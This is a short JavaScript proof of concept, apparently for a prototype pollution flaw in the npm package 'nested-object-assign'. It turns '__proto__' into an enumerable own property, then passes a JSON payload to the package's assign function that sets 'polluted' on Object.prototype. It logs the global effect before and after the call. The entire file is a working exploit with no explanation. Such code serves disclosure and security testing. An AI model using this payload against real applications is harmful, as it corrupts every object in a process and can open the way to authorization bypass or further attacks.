var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const assign = require('nested-object-assign');
console.log({}.polluted);
assign(obj, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);